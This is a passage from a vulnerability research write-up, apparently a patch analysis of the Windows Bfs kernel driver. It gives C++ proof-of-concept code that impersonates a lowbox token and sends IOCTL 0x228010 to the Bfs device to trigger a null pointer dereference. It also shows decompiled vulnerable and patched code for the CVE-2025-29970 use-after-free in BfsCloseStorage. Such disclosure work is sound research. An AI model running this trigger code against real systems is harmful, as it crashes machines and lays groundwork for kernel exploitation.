+<span id="cb17-128"><a href="#cb17-128" aria-hidden="true" tabindex="-1"></a>    POBJECT_ATTRIBUTES ObjectAttributes</span>
+<span id="cb17-129"><a href="#cb17-129" aria-hidden="true" tabindex="-1"></a><span class="op">);</span></span>
+<span id="cb17-130"><a href="#cb17-130" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-131"><a href="#cb17-131" aria-hidden="true" tabindex="-1"></a><span class="co">// Needed for UNICODE_STRING initialization</span></span>
+<span id="cb17-132"><a href="#cb17-132" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> InitUnicodeString<span class="op">(</span>PUNICODE_STRING destination<span class="op">,</span> <span class="dt">const</span> <span class="dt">wchar_t</span><span class="op">*</span> source<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb17-133"><a href="#cb17-133" aria-hidden="true" tabindex="-1"></a>    <span class="dt">size_t</span> len <span class="op">=</span> wcslen<span class="op">(</span>source<span class="op">)</span> <span class="op">*</span> <span class="kw">sizeof</span><span class="op">(</span><span class="dt">wchar_t</span><span class="op">);</span></span>
+<span id="cb17-134"><a href="#cb17-134" aria-hidden="true" tabindex="-1"></a>    destination<span class="op">-&gt;</span>Length <span class="op">=</span> static_cast<span class="op">&lt;</span>USHORT<span class="op">&gt;(</span>len<span class="op">);</span></span>
+<span id="cb17-135"><a href="#cb17-135" aria-hidden="true" tabindex="-1"></a>    destination<span class="op">-&gt;</span>MaximumLength <span class="op">=</span> static_cast<span class="op">&lt;</span>USHORT<span class="op">&gt;(</span>len <span class="op">+</span> <span class="kw">sizeof</span><span class="op">(</span><span class="dt">wchar_t</span><span class="op">));</span></span>
+<span id="cb17-136"><a href="#cb17-136" aria-hidden="true" tabindex="-1"></a>    destination<span class="op">-&gt;</span>Buffer <span class="op">=</span> const_cast<span class="op">&lt;</span>PWSTR<span class="op">&gt;(</span>source<span class="op">);</span></span>
+<span id="cb17-137"><a href="#cb17-137" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb17-138"><a href="#cb17-138" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-139"><a href="#cb17-139" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-140"><a href="#cb17-140" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">()</span> <span class="op">{</span></span>
+<span id="cb17-141"><a href="#cb17-141" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-142"><a href="#cb17-142" aria-hidden="true" tabindex="-1"></a>    Debug <span class="op">=</span> TRUE<span class="op">;</span></span>
+<span id="cb17-143"><a href="#cb17-143" aria-hidden="true" tabindex="-1"></a>    HANDLE hToken <span class="op">=</span> GenerateLowBoxToken<span class="op">();</span></span>
+<span id="cb17-144"><a href="#cb17-144" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-145"><a href="#cb17-145" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-146"><a href="#cb17-146" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>hToken <span class="op">!=</span> INVALID_HANDLE_VALUE<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb17-147"><a href="#cb17-147" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-148"><a href="#cb17-148" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-149"><a href="#cb17-149" aria-hidden="true" tabindex="-1"></a>        HANDLE hDevice <span class="op">=</span> CreateFileW<span class="op">(</span></span>
+<span id="cb17-150"><a href="#cb17-150" aria-hidden="true" tabindex="-1"></a>            <span class="st">L&quot;</span><span class="sc">\\\\</span><span class="st">?</span><span class="sc">\\</span><span class="st">GLOBALROOT</span><span class="sc">\\</span><span class="st">Device</span><span class="sc">\\</span><span class="st">Bfs&quot;</span><span class="op">,</span></span>
+<span id="cb17-151"><a href="#cb17-151" aria-hidden="true" tabindex="-1"></a>            GENERIC_READ <span class="op">|</span> GENERIC_WRITE<span class="op">,</span></span>
+<span id="cb17-152"><a href="#cb17-152" aria-hidden="true" tabindex="-1"></a>            <span class="dv">0</span><span class="op">,</span></span>
+<span id="cb17-153"><a href="#cb17-153" aria-hidden="true" tabindex="-1"></a>            NULL<span class="op">,</span></span>
+<span id="cb17-154"><a href="#cb17-154" aria-hidden="true" tabindex="-1"></a>            OPEN_EXISTING<span class="op">,</span></span>
+<span id="cb17-155"><a href="#cb17-155" aria-hidden="true" tabindex="-1"></a>            <span class="dv">0</span><span class="op">,</span></span>
+<span id="cb17-156"><a href="#cb17-156" aria-hidden="true" tabindex="-1"></a>            NULL<span class="op">);</span></span>
+<span id="cb17-157"><a href="#cb17-157" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>hDevice <span class="op">!=</span> INVALID_HANDLE_VALUE<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb17-158"><a href="#cb17-158" aria-hidden="true" tabindex="-1"></a>            printf<span class="op">(</span><span class="st">&quot;Successfully Opened Handle to Device</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb17-159"><a href="#cb17-159" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb17-160"><a href="#cb17-160" aria-hidden="true" tabindex="-1"></a>        <span class="cf">else</span> <span class="op">{</span></span>
+<span id="cb17-161"><a href="#cb17-161" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-162"><a href="#cb17-162" aria-hidden="true" tabindex="-1"></a>            printf<span class="op">(</span><span class="st">&quot;Error Opening Handle to Device </span><span class="sc">%d</span><span class="st">&quot;</span><span class="op">,</span> GetLastError<span class="op">());</span></span>
+<span id="cb17-163"><a href="#cb17-163" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-164"><a href="#cb17-164" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb17-165"><a href="#cb17-165" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-166"><a href="#cb17-166" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(!</span>ImpersonateLoggedOnUser<span class="op">(</span>hToken<span class="op">))</span> <span class="op">{</span></span>
+<span id="cb17-167"><a href="#cb17-167" aria-hidden="true" tabindex="-1"></a>            printf<span class="op">(</span><span class="st">&quot;Could not impersonate in thread :( &quot;</span><span class="op">);</span></span>
+<span id="cb17-168"><a href="#cb17-168" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span> <span class="dv">1</span><span class="op">;</span></span>
+<span id="cb17-169"><a href="#cb17-169" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb17-170"><a href="#cb17-170" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-171"><a href="#cb17-171" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;Impersonated Lowbox Token</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb17-172"><a href="#cb17-172" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-173"><a href="#cb17-173" aria-hidden="true" tabindex="-1"></a>        BOOL nt <span class="op">=</span> <span class="kw">true</span><span class="op">;</span> <span class="co">// was using this for te</span></span>
+<span id="cb17-174"><a href="#cb17-174" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-175"><a href="#cb17-175" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-176"><a href="#cb17-176" aria-hidden="true" tabindex="-1"></a>        <span class="dt">const</span> <span class="dt">wchar_t</span><span class="op">*</span> path <span class="op">=</span> <span class="st">L&quot;</span><span class="sc">\\</span><span class="st">Registry</span><span class="sc">\\</span><span class="st">WC</span><span class="sc">\\</span><span class="st">Silo</span><span class="sc">\\</span><span class="st">9&quot;</span><span class="op">;</span>  <span class="co">// Replace &quot;9&quot; with your silo ID</span></span>
+<span id="cb17-177"><a href="#cb17-177" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-178"><a href="#cb17-178" aria-hidden="true" tabindex="-1"></a>        UNICODE_STRING keyPath<span class="op">;</span></span>
+<span id="cb17-179"><a href="#cb17-179" aria-hidden="true" tabindex="-1"></a>        InitUnicodeString<span class="op">(&amp;</span>keyPath<span class="op">,</span> path<span class="op">);</span></span>
+<span id="cb17-180"><a href="#cb17-180" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-181"><a href="#cb17-181" aria-hidden="true" tabindex="-1"></a>        OBJECT_ATTRIBUTES objAttr<span class="op">;</span></span>
+<span id="cb17-182"><a href="#cb17-182" aria-hidden="true" tabindex="-1"></a>        InitializeObjectAttributes<span class="op">(&amp;</span>objAttr<span class="op">,</span> <span class="op">&amp;</span>keyPath<span class="op">,</span> OBJ_CASE_INSENSITIVE<span class="op">,</span> NULL<span class="op">,</span> NULL<span class="op">);</span></span>
+<span id="cb17-183"><a href="#cb17-183" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-184"><a href="#cb17-184" aria-hidden="true" tabindex="-1"></a>        HANDLE hKey <span class="op">=</span> <span class="kw">nullptr</span><span class="op">;</span></span>
+<span id="cb17-185"><a href="#cb17-185" aria-hidden="true" tabindex="-1"></a>        NTSTATUS status <span class="op">=</span> NtOpenKey<span class="op">(&amp;</span>hKey<span class="op">,</span> KEY_READ<span class="op">,</span> <span class="op">&amp;</span>objAttr<span class="op">);</span></span>
+<span id="cb17-186"><a href="#cb17-186" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-187"><a href="#cb17-187" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>NT_SUCCESS<span class="op">(</span>status<span class="op">))</span> <span class="op">{</span></span>
+<span id="cb17-188"><a href="#cb17-188" aria-hidden="true" tabindex="-1"></a>            printf<span class="op">(</span><span class="st">&quot;Successfully opened key : %ws</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> path<span class="op">);</span></span>
+<span id="cb17-189"><a href="#cb17-189" aria-hidden="true" tabindex="-1"></a>            NtClose<span class="op">(</span>hKey<span class="op">);</span></span>
+<span id="cb17-190"><a href="#cb17-190" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb17-191"><a href="#cb17-191" aria-hidden="true" tabindex="-1"></a>        <span class="cf">else</span> <span class="op">{</span></span>
+<span id="cb17-192"><a href="#cb17-192" aria-hidden="true" tabindex="-1"></a>            printf<span class="op">(</span><span class="st">&quot;Failed to open key. NTSTATUS: 0x</span><span class="sc">%X\n</span><span class="st">&quot;</span><span class="op">,</span>status<span class="op">);</span></span>
+<span id="cb17-193"><a href="#cb17-193" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb17-194"><a href="#cb17-194" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-195"><a href="#cb17-195" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-196"><a href="#cb17-196" aria-hidden="true" tabindex="-1"></a>        DWORD ret<span class="op">;</span></span>
+<span id="cb17-197"><a href="#cb17-197" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-198"><a href="#cb17-198" aria-hidden="true" tabindex="-1"></a>        PDeletePolicyRequest inBuf <span class="op">=</span> <span class="op">(</span>PDeletePolicyRequest<span class="op">)</span>HeapAlloc<span class="op">(</span>GetProcessHeap<span class="op">(),</span> HEAP_ZERO_MEMORY<span class="op">,</span> <span class="kw">sizeof</span><span class="op">(</span>PDeletePolicyRequest<span class="op">));</span></span>
+<span id="cb17-199"><a href="#cb17-199" aria-hidden="true" tabindex="-1"></a>        inBuf<span class="op">-&gt;</span>hToken <span class="op">=</span> hToken<span class="op">;</span></span>
+<span id="cb17-200"><a href="#cb17-200" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>DeviceIoControl<span class="op">(</span>hDevice<span class="op">,</span> <span class="bn">0x228010</span><span class="op">,</span> <span class="op">(</span>LPVOID<span class="op">)</span>inBuf<span class="op">,</span> <span class="kw">sizeof</span><span class="op">(</span>PDeletePolicyRequest<span class="op">),</span> NULL<span class="op">,</span> NULL<span class="op">,</span> <span class="op">&amp;</span>ret<span class="op">,</span> NULL<span class="op">))</span> <span class="op">{</span></span>
+<span id="cb17-201"><a href="#cb17-201" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-202"><a href="#cb17-202" aria-hidden="true" tabindex="-1"></a>            printf<span class="op">(</span><span class="st">&quot;Success DeviceIoControl&quot;</span><span class="op">,</span> GetLastError<span class="op">());</span></span>
+<span id="cb17-203"><a href="#cb17-203" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-204"><a href="#cb17-204" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb17-205"><a href="#cb17-205" aria-hidden="true" tabindex="-1"></a>        <span class="cf">else</span> <span class="op">{</span></span>
+<span id="cb17-206"><a href="#cb17-206" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-207"><a href="#cb17-207" aria-hidden="true" tabindex="-1"></a>            printf<span class="op">(</span><span class="st">&quot;Error DeviceIoControl </span><span class="sc">%d\n</span><span class="st">&quot;</span><span class="op">,</span> GetLastError<span class="op">());</span></span>
+<span id="cb17-208"><a href="#cb17-208" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-209"><a href="#cb17-209" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb17-210"><a href="#cb17-210" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-211"><a href="#cb17-211" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb17-212"><a href="#cb17-212" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb17-213"><a href="#cb17-213" aria-hidden="true" tabindex="-1"></a>    <span class="cf">else</span> <span class="op">{</span></span>
+<span id="cb17-214"><a href="#cb17-214" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-215"><a href="#cb17-215" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;Error, did not recieve valid valid token handle&quot;</span><span class="op">);</span></span>
+<span id="cb17-216"><a href="#cb17-216" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-217"><a href="#cb17-217" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb17-218"><a href="#cb17-218" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-219"><a href="#cb17-219" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb17-220"><a href="#cb17-220" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-221"><a href="#cb17-221" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p><strong><code>BfsEnumeratePolicy</code> NPD Trigger Code</strong></p>
+<h2 id="triggering-cve-2025-29970">Triggering <code>CVE-2025-29970</code></h2>
+<p>After addressing the <code>BfsEnumeratePolicy</code> null pointer dereference (by creating a legitimate policy entry through the <code>BfsProcessSetPolicyRequest</code>) function. Another, attempt was made to trigger <code>CVE-2025-21315</code>. When calling <code>BfsDereferencePolicyEntry</code> this time, the original NPD did not trigger but another blue screen was encountered in <code>BfsCloseStorage</code>, a function called to clean up the storage object in the <code>PolicyEntry</code> object. When reviewing the code around the crash, it was apparent that an object was being freed in a looping mechanism as shown below:</p>
+<div class="sourceCode" id="cb18"><pre
+class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a>  <span class="cf">for</span> <span class="op">(</span> Index <span class="op">=</span> StorageObj<span class="op">-&gt;</span>Alloc_BfsH<span class="op">;</span> <span class="op">;</span> ExFreePoolWithTag<span class="op">(</span>Index<span class="op">,</span> <span class="dv">0</span><span class="op">)</span> <span class="op">)<span class="co"> // free</span></span></span>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
+<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a>    DereferncedPtr <span class="op">=</span> <span class="op">*</span>Index<span class="op">;</span> <span class="co">// Use</span></span>
+<span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span> <span class="op">*</span>Index <span class="op">==</span> Index <span class="op">)</span></span>
+<span id="cb18-5"><a href="#cb18-5" aria-hidden="true" tabindex="-1"></a>      <span class="cf">break</span><span class="op">;</span></span>
+<span id="cb18-6"><a href="#cb18-6" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span> <span class="op">*(</span>DereferncedPtr <span class="op">+</span> <span class="dv">1</span><span class="op">)</span> <span class="op">!=</span> Index <span class="op">||</span> <span class="op">(</span>v6 <span class="op">=</span> <span class="op">*</span>DereferncedPtr<span class="op">,</span> <span class="op">*(*</span>DereferncedPtr <span class="op">+</span> <span class="dv">8</span><span class="bu">LL</span><span class="op">)</span> <span class="op">!=</span> DereferncedPtr<span class="op">)</span> <span class="op">)</span></span>
+<span id="cb18-7"><a href="#cb18-7" aria-hidden="true" tabindex="-1"></a>      __fastfail<span class="op">(</span><span class="dv">3</span><span class="bu">u</span><span class="op">);</span></span>
+<span id="cb18-8"><a href="#cb18-8" aria-hidden="true" tabindex="-1"></a>    <span class="op">*</span>Index <span class="op">=</span> v6<span class="op">;</span></span>
+<span id="cb18-9"><a href="#cb18-9" aria-hidden="true" tabindex="-1"></a>    v6<span class="op">[</span><span class="dv">1</span><span class="op">]</span> <span class="op">=</span> Index<span class="op">;</span></span>
+<span id="cb18-10"><a href="#cb18-10" aria-hidden="true" tabindex="-1"></a>    ExFreePoolWithTag<span class="op">(*(</span>DereferncedPtr <span class="op">+</span> <span class="dv">2</span><span class="op">),</span> <span class="dv">0</span><span class="op">);</span></span>
+<span id="cb18-11"><a href="#cb18-11" aria-hidden="true" tabindex="-1"></a>    ExFreePoolWithTag<span class="op">(</span>DereferncedPtr<span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span>
+<span id="cb18-12"><a href="#cb18-12" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span></code></pre></div>
+<p><strong><code>BfsCloseStorage</code> UAF Bug Logic</strong></p>
+<p>The real issue occurs because a pointer was being freed and then dereferenced again when the code loops again. To patch the bug, Microsoft simply moved the free outside of the loop as shown below:</p>
+<div class="sourceCode" id="cb19"><pre
+class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span> <span class="op">(</span><span class="dt">unsigned</span> <span class="dt">int</span><span class="op">)</span>CVE_2025_29970_Patch<span class="op">()</span> <span class="op">)</span></span>
+<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
+<span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a>    <span class="cf">while</span> <span class="op">(</span> <span class="dv">1</span> <span class="op">)</span></span>
+<span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
+<span id="cb19-5"><a href="#cb19-5" aria-hidden="true" tabindex="-1"></a>      v4 <span class="op">=</span> <span class="op">*(</span>PVOID <span class="op">*)</span>Index<span class="op">;</span></span>
+<span id="cb19-6"><a href="#cb19-6" aria-hidden="true" tabindex="-1"></a>      <span class="cf">if</span> <span class="op">(</span> <span class="op">*(</span>PVOID <span class="op">*)</span>Index <span class="op">==</span> Index <span class="op">)</span></span>
+<span id="cb19-7"><a href="#cb19-7" aria-hidden="true" tabindex="-1"></a>        <span class="cf">break</span><span class="op">;</span></span>
+<span id="cb19-8"><a href="#cb19-8" aria-hidden="true" tabindex="-1"></a>      <span class="cf">if</span> <span class="op">(</span> <span class="op">*((</span>PVOID <span class="op">*)</span>v4 <span class="op">+</span> <span class="dv">1</span><span class="op">)</span> <span class="op">!=</span> Index <span class="op">||</span> <span class="op">(</span>v5 <span class="op">=</span> <span class="op">*(</span>_QWORD <span class="op">*)</span>v4<span class="op">,</span> <span class="op">*(</span>PVOID <span class="op">*)(*(</span>_QWORD <span class="op">*)</span>v4 <span class="op">+</span> <span class="dv">8</span><span class="bu">LL</span><span class="op">)</span> <span class="op">!=</span> v4<span class="op">)</span> <span class="op">)</span></span>
+<span id="cb19-9"><a href="#cb19-9" aria-hidden="true" tabindex="-1"></a>LABEL_10<span class="op">:</span></span>
+<span id="cb19-10"><a href="#cb19-10" aria-hidden="true" tabindex="-1"></a>        __fastfail<span class="op">(</span><span class="dv">3</span><span class="bu">u</span><span class="op">);</span></span>
+<span id="cb19-11"><a href="#cb19-11" aria-hidden="true" tabindex="-1"></a>      <span class="op">*(</span>_QWORD <span class="op">*)</span>Index <span class="op">=</span> v5<span class="op">;</span></span>
+<span id="cb19-12"><a href="#cb19-12" aria-hidden="true" tabindex="-1"></a>      <span class="op">*(</span>_QWORD <span class="op">*)(</span>v5 <span class="op">+</span> <span class="dv">8</span><span class="op">)</span> <span class="op">=</span> Index<span class="op">;</span></span>
+<span id="cb19-13"><a href="#cb19-13" aria-hidden="true" tabindex="-1"></a>      ExFreePoolWithTag<span class="op">(*((</span>PVOID <span class="op">*)</span>v4 <span class="op">+</span> <span class="dv">2</span><span class="op">),</span> <span class="dv">0</span><span class="op">);</span></span>
+<span id="cb19-14"><a href="#cb19-14" aria-hidden="true" tabindex="-1"></a>      ExFreePoolWithTag<span class="op">(</span>v4<span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span>
+<span id="cb19-15"><a href="#cb19-15" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb19-16"><a href="#cb19-16" aria-hidden="true" tabindex="-1"></a>    ExFreePoolWithTag<span class="op">(</span>Index<span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span>
+<span id="cb19-17"><a href="#cb19-17" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span></code></pre></div>
+<p><strong><code>CVE-2025-29970</code> Patch</strong></p>
